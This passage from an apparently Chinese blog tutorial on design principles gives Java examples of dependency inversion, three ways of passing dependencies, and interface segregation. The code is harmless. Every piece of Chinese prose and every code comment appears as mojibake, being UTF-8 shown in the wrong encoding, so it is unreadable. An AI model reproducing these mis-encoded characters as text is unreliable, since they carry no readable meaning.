ä¸­ï¼ŒæŠ½è±¡æŒ‡çš„æ˜¯æ¥å£æˆ–æŠ½è±¡ç±»ï¼Œç»†èŠ‚å°±æ˜¯å…·ä½“çš„å®ç°ç±»</p></li><li><p>ä½¿ç”¨<strong>æ¥å£æˆ–æŠ½è±¡ç±»</strong>çš„ç›®çš„æ˜¯åˆ¶å®šå¥½<strong>è§„èŒƒ</strong>ï¼Œè€Œä¸æ¶‰åŠä»»ä½•å…·ä½“çš„æ“ä½œï¼ŒæŠŠ<strong>å±•ç°ç»†èŠ‚çš„ä»»åŠ¡äº¤ç»™ä»–ä»¬çš„å®ç°ç±»</strong>å»å®Œæˆ</p></li></ol><h3 id="å®ç°æ–¹æ¡ˆ-1-åˆ†æè¯´æ˜"><a class="markdownIt-Anchor" href="#å®ç°æ–¹æ¡ˆ-1-åˆ†æè¯´æ˜"></a> å®ç°æ–¹æ¡ˆ 1 + åˆ†æè¯´æ˜</h3><p><code>DependecyInversion.java</code></p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.inversion;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DependecyInversion</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>      person.receive(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Email</span>());<br>   &#125;<br><br>&#125;<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ç”µå­é‚®ä»¶ä¿¡æ¯: hello,world&quot;</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//å®ŒæˆPersonæ¥æ”¶æ¶ˆæ¯çš„åŠŸèƒ½</span><br><span class="hljs-comment">//æ–¹å¼1åˆ†æ</span><br><span class="hljs-comment">//1. ç®€å•ï¼Œæ¯”è¾ƒå®¹æ˜“æƒ³åˆ°</span><br><span class="hljs-comment">//2. å¦‚æœæˆ‘ä»¬è·å–çš„å¯¹è±¡æ˜¯ å¾®ä¿¡ï¼ŒçŸ­ä¿¡ç­‰ç­‰ï¼Œåˆ™æ–°å¢ç±»ï¼ŒåŒæ—¶Peronsä¹Ÿè¦å¢åŠ ç›¸åº”çš„æ¥æ”¶æ–¹æ³•</span><br><span class="hljs-comment">//3. è§£å†³æ€è·¯ï¼šå¼•å…¥ä¸€ä¸ªæŠ½è±¡çš„æ¥å£IReceiver, è¡¨ç¤ºæ¥æ”¶è€…, è¿™æ ·Personç±»ä¸æ¥å£IReceiverå‘ç”Ÿä¾èµ–</span><br><span class="hljs-comment">//   å› ä¸ºEmail, WeiXin ç­‰ç­‰å±äºæ¥æ”¶çš„èŒƒå›´ï¼Œä»–ä»¬å„è‡ªå®ç°IReceiver æ¥å£å°±ok, è¿™æ ·æˆ‘ä»¬å°±ç¬¦å·ä¾èµ–å€’è½¬åŸåˆ™</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receive</span><span class="hljs-params">(Email email )</span> &#123;<br>      System.out.println(email.getInfo());<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å®ç°æ–¹æ¡ˆ-2ä¾èµ–å€’è½¬-åˆ†æè¯´æ˜"><a class="markdownIt-Anchor" href="#å®ç°æ–¹æ¡ˆ-2ä¾èµ–å€’è½¬-åˆ†æè¯´æ˜"></a> å®ç°æ–¹æ¡ˆ 2(ä¾èµ–å€’è½¬) + åˆ†æè¯´æ˜</h3><p><code>DependecyInversion.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.inversion.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DependecyInversion</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">//å®¢æˆ·ç«¯æ— éœ€æ”¹å˜</span><br>      <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();<br>      person.receive(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Email</span>());<br>      <br>      person.receive(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WeiXin</span>());<br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//å®šä¹‰æ¥å£</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IReceiver</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Email</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IReceiver</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ç”µå­é‚®ä»¶ä¿¡æ¯: hello,world&quot;</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//å¢åŠ å¾®ä¿¡</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeiXin</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IReceiver</span> &#123;<br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;å¾®ä¿¡ä¿¡æ¯: hello,ok&quot;</span>;<br>   &#125;<br>&#125;<br><br><span class="hljs-comment">//æ–¹å¼2</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>   <span class="hljs-comment">//è¿™é‡Œæˆ‘ä»¬æ˜¯å¯¹æ¥å£çš„ä¾èµ–</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receive</span><span class="hljs-params">(IReceiver receiver )</span> &#123;<br>      System.out.println(receiver.getInfo());<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¾èµ–å…³ç³»ä¼ é€’çš„ä¸‰ç§æ–¹å¼å’Œåº”ç”¨æ¡ˆä¾‹"><a class="markdownIt-Anchor" href="#ä¾èµ–å…³ç³»ä¼ é€’çš„ä¸‰ç§æ–¹å¼å’Œåº”ç”¨æ¡ˆä¾‹"></a> ä¾èµ–å…³ç³»ä¼ é€’çš„ä¸‰ç§æ–¹å¼å’Œåº”ç”¨æ¡ˆä¾‹</h3><ol><li><p>æ¥å£ä¼ é€’</p><p>åº”ç”¨æ¡ˆä¾‹ä»£ç </p></li><li><p>æ„é€ æ–¹æ³•ä¼ é€’</p><p>åº”ç”¨æ¡ˆä¾‹ä»£ç </p></li><li><p>setter æ–¹å¼ä¼ é€’</p></li></ol><p><code>DependencyPass.java</code></p>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.inversion.improve;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DependencyPass</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-type">ChangHong</span> <span class="hljs-variable">changHong</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChangHong</span>();<br><span class="hljs-comment">//    OpenAndClose openAndClose = new OpenAndClose();</span><br><span class="hljs-comment">//    openAndClose.open(changHong);</span><br>      <br>      <span class="hljs-comment">//é€šè¿‡æ„é€ å™¨è¿›è¡Œä¾èµ–ä¼ é€’</span><br><span class="hljs-comment">//    OpenAndClose openAndClose = new OpenAndClose(changHong);</span><br><span class="hljs-comment">//    openAndClose.open();</span><br>      <span class="hljs-comment">//é€šè¿‡setteræ–¹æ³•è¿›è¡Œä¾èµ–ä¼ é€’</span><br>      <span class="hljs-type">OpenAndClose</span> <span class="hljs-variable">openAndClose</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OpenAndClose</span>();<br>      openAndClose.setTv(changHong);<br>      openAndClose.open();<br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">// æ–¹å¼1ï¼š é€šè¿‡æ¥å£ä¼ é€’å®ç°ä¾èµ–</span><br><span class="hljs-comment">// å¼€å…³çš„æ¥å£</span><br><span class="hljs-comment">// interface IOpenAndClose &#123;</span><br><span class="hljs-comment">// public void open(ITV tv); //æŠ½è±¡æ–¹æ³•,æ¥æ”¶æ¥å£</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// interface ITV &#123; //ITVæ¥å£</span><br><span class="hljs-comment">// public void play();</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// </span><br><span class="hljs-comment">// class ChangHong implements ITV &#123;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// @Override</span><br><span class="hljs-comment">// public void play() &#123;</span><br><span class="hljs-comment">//    // TODO Auto-generated method stub</span><br><span class="hljs-comment">//    System.out.println(&quot;é•¿è™¹ç”µè§†æœºï¼Œæ‰“å¼€&quot;);</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">//  </span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">//// å®ç°æ¥å£</span><br><span class="hljs-comment">// class OpenAndClose implements IOpenAndClose&#123;</span><br><span class="hljs-comment">// public void open(ITV tv)&#123;</span><br><span class="hljs-comment">// tv.play();</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// æ–¹å¼2: é€šè¿‡æ„é€ æ–¹æ³•ä¾èµ–ä¼ é€’</span><br><span class="hljs-comment">// interface IOpenAndClose &#123;</span><br><span class="hljs-comment">// public void open(); //æŠ½è±¡æ–¹æ³•</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// interface ITV &#123; //ITVæ¥å£</span><br><span class="hljs-comment">// public void play();</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// class OpenAndClose implements IOpenAndClose&#123;</span><br><span class="hljs-comment">// public ITV tv; //æˆå‘˜</span><br><span class="hljs-comment">// public OpenAndClose(ITV tv)&#123; //æ„é€ å™¨</span><br><span class="hljs-comment">// this.tv = tv;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// public void open()&#123;</span><br><span class="hljs-comment">// this.tv.play();</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-comment">// &#125;</span><br><br><br><span class="hljs-comment">// æ–¹å¼3 , é€šè¿‡setteræ–¹æ³•ä¼ é€’</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">IOpenAndClose</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span>; <span class="hljs-comment">// æŠ½è±¡æ–¹æ³•</span><br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTv</span><span class="hljs-params">(ITV tv)</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">ITV</span> &#123; <span class="hljs-comment">// ITVæ¥å£</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OpenAndClose</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IOpenAndClose</span> &#123;<br>   <span class="hljs-keyword">private</span> ITV tv;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTv</span><span class="hljs-params">(ITV tv)</span> &#123;<br>      <span class="hljs-built_in">this</span>.tv = tv;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">open</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-built_in">this</span>.tv.play();<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChangHong</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ITV</span> &#123;<br><br>   <span class="hljs-meta">@Override</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">play</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      System.out.println(<span class="hljs-string">&quot;é•¿è™¹ç”µè§†æœºï¼Œæ‰“å¼€&quot;</span>);<br>   &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¾èµ–å€’è½¬åŸåˆ™çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"><a class="markdownIt-Anchor" href="#ä¾èµ–å€’è½¬åŸåˆ™çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚"></a> ä¾èµ–å€’è½¬åŸåˆ™çš„æ³¨æ„äº‹é¡¹å’Œç»†èŠ‚</h3><ol><li><p>ä½å±‚æ¨¡å—å°½é‡éƒ½è¦æœ‰æŠ½è±¡ç±»æˆ–æ¥å£ï¼Œæˆ–è€…ä¸¤è€…éƒ½æœ‰ï¼Œç¨‹åºç¨³å®šæ€§æ›´å¥½.</p></li><li><p>å˜é‡çš„<strong>å£°æ˜ç±»å‹å°½é‡æ˜¯æŠ½è±¡ç±»æˆ–æ¥å£</strong>, è¿™æ ·æˆ‘ä»¬çš„å˜é‡å¼•ç”¨å’Œå®é™…å¯¹è±¡é—´ï¼Œå°±å­˜åœ¨<strong>ä¸€ä¸ªç¼“å†²å±‚</strong>ï¼Œåˆ©äºç¨‹åºæ‰©å±•å’Œä¼˜åŒ–</p></li><li><p>ç»§æ‰¿æ—¶éµå¾ª<strong>é‡Œæ°æ›¿æ¢</strong>åŸåˆ™</p></li></ol><h2 id="4-æ¥å£éš”ç¦»åŸåˆ™interface-segregation-principle"><a class="markdownIt-Anchor" href="#4-æ¥å£éš”ç¦»åŸåˆ™interface-segregation-principle"></a> <strong>4ã€æ¥å£éš”ç¦»åŸåˆ™ï¼ˆInterface Segregation Principleï¼‰</strong></h2><p>è¿™ä¸ªåŸåˆ™çš„æ„æ€æ˜¯ï¼šä½¿ç”¨å¤šä¸ªéš”ç¦»çš„æ¥å£ï¼Œæ¯”ä½¿ç”¨å•ä¸ªæ¥å£è¦å¥½ã€‚å®ƒè¿˜æœ‰å¦å¤–ä¸€ä¸ªæ„æ€æ˜¯ï¼šé™ä½ç±»ä¹‹é—´çš„è€¦åˆåº¦ã€‚ç”±æ­¤å¯è§ï¼Œå…¶å®è®¾è®¡æ¨¡å¼å°±æ˜¯ä»å¤§å‹è½¯ä»¶æ¶æ„å‡ºå‘ã€ä¾¿äºå‡çº§å’Œç»´æŠ¤çš„è½¯ä»¶è®¾è®¡æ€æƒ³ï¼Œå®ƒå¼ºè°ƒé™ä½ä¾èµ–ï¼Œé™ä½è€¦åˆã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230108200601362.png" alt="image-20230108200601362" /></p><ol><li><p>ç±» A é€šè¿‡æ¥å£ Interface1 ä¾èµ–ç±» Bï¼Œç±» C é€šè¿‡æ¥å£ Interface1 ä¾èµ–ç±» Dï¼Œå¦‚æœæ¥å£ Interface1 å¯¹äºç±» A å’Œç±» Cæ¥è¯´ä¸æ˜¯æœ€å°æ¥å£ï¼Œé‚£ä¹ˆç±» B å’Œç±» D å¿…é¡»å»å®ç°ä»–ä»¬ä¸éœ€è¦çš„æ–¹æ³•ã€‚</p></li><li><p>æŒ‰éš”ç¦»åŸåˆ™åº”å½“è¿™æ ·å¤„ç†ï¼š</p></li></ol><p><strong>å°†æ¥å£ Interface1</strong> æ‹†åˆ†ä¸º<strong>ç‹¬ç«‹çš„å‡ ä¸ªæ¥å£(è¿™é‡Œæˆ‘ä»¬æ‹†åˆ†æˆ 3 ä¸ªæ¥å£)</strong>ï¼Œç±» A å’Œç±» C åˆ†åˆ«ä¸ä»–ä»¬éœ€è¦çš„æ¥å£å»ºç«‹ä¾èµ–å…³ç³»ã€‚ä¹Ÿå°±æ˜¯é‡‡ç”¨æ¥å£éš”ç¦»åŸåˆ™</p><p><code>Segregation1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.principle.segregation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Segregation1</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br><br>   &#125;<br><br>&#125;<br><br><span class="hljs-comment">//æ¥å£</span><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span>;<br>   <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation1&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation2&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation3&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation4&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;B å®ç°äº† operation5&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">D</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Interface1</span> &#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation1</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation1&quot;</span>);<br>   &#125;<br>   <br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation2</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation2&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation3</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation3&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation4</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation4&quot;</span>);<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">operation5</span><span class="hljs-params">()</span> &#123;<br>      System.out.println(<span class="hljs-string">&quot;D å®ç°äº† operation5&quot;</span>);<br>   &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span> &#123; <span class="hljs-comment">//A ç±»é€šè¿‡æ¥å£Interface1 ä¾èµ–(ä½¿ç”¨) Bç±»ï¼Œä½†æ˜¯åªä¼šç”¨åˆ°1,2,3æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend2</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation2();<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend3</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation3();<br>   &#125;<br>&#125;<br>  <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">C</span> &#123; <span class="hljs-comment">//C ç±»é€šè¿‡æ¥å£Interface1 ä¾èµ–(ä½¿ç”¨) Dç±»ï¼Œä½†æ˜¯åªä¼šç”¨åˆ°1,4,5æ–¹æ³•</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend1</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation1();<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend4</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation4();<br>   &#125;<br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">depend5</span><span class="hljs-params">(Interface1 i)</span> &#123;<br>      i.operation5();<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Segregation1.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 